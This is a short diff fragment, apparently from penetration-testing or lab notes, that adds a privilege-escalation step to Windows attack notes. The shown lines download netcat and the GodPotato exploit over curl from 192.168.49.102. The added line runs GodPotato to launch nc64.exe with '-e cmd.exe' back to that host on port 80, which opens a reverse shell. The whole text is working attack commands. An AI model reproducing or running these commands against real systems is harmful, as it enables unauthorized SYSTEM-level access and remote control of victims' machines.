@@ -103,6 +103,11 @@ uploaded GodPotato and nc
 curl http://192.168.49.102/nc.exe -o nc.exe
 curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
 
+.\GodPotato-NET4.exe -cmd "C:\users\svc_sql\Desktop\nc64.exe 192.168.49.102 80 -e cmd.exe"
+
+
+
+
 
 
 
